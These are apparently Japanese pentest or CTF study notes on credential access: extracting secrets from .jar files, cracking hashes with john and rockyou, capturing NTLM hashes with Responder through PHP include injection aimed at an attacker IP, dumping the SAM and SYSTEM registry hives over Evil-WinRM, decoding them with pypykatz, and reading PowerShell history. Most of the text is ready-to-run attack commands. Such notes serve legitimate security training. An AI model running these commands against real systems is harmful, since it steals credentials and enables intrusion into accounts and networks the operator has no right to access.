# 資格情報アクセス

## アプリケーションに含まれる情報
・.jarの情報はJD-GUIで見れる
    ・Spring Bootを使用していればapplication.propertiesで見れる


## パスワードハッシュ解析
DB等から取得したパスワードハッシュを復元することで、パスワードを使いまわしている場合に別システムに侵入できる

Hash Identinierでハッシュ値の形式を特定できる

```
hash-identifier
```

johnでパスワード解析できる
```
john --format=raw-sha512 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
```
Kali Linuxであれば/user/share/wordlistsにrockyouの圧縮されたファイルがある。
formatで指定できる形式は以下を参照
https://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats

パスワード解析にはWebから使用できるCrackStationも便利
https://crackstation.net/

## NTLMハッシュの取得

### Responder
```
responder -I tun0
```
Responderを使用することで様々な通信を受けることができる
responderを起動した後、攻撃対象のWebアプリケーション等に対して外部のファイルを取得するように動かす
```
例：PHPでinclude(//<受けのIPアドレス>/somefile)を実行されるようCodeInjectionを行うなど
```
取得できたハッシュをjohnなどで解析する

### Windowsレジストリにアクセスできる場合
Windowsでレジストリにアクセスできる場合、以下の情報を集めると良い
* HKLM\SAM: ユーザーパスワードのNTLMv2 ハッシュを含む
* HKLM\security: キャッシュされたドメインレコード LSAシークレット/LSAキーを含む
* HKLM\system – 別名 SYSKEY: LSAシークレットやSAMデータベースを暗号化するために使用可能なキーを含む
hklm\systemとhklm\samからNTLMハッシュを取得できる

参考：
https://kb.offsec.nl/tools/framework/pypykatz/

(例) SeBackupPrivilege権限を持つ場合に、レジストリからNTLMハッシュを生成
何かしらのユーザ情報を使用してEvil-WinRMでシェルを取っており、ユーザがSeBackupPrivilege権限を持っている前提
```
*Evil-WinRM* PS C:\> reg save hklm\sam c:\Temp\sam
*Evil-WinRM* PS C:\> reg save hklm\system c:\Temp\system
```
でレジストリをコピー
```
*Evil-WinRM* PS C:\Temp> download sam
*Evil-WinRM* PS C:\Temp> download system
```
でファイルをダウンロードする。ダウンロードしたファイルを元にpypykatzを使用してNTLMハッシュを生成する
```
$ pypykatz registry --sam sam system
```

## デフォルトパスワードの使用
サービスごとのデフォルトパスワードでログインできないか試行する。

https://cirt.net/passwords

## Powershellの履歴取得
以下の場所からPowerShellのコマンド実行履歴を取得できる

```
type C:\Users\<ユーザ>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt 
```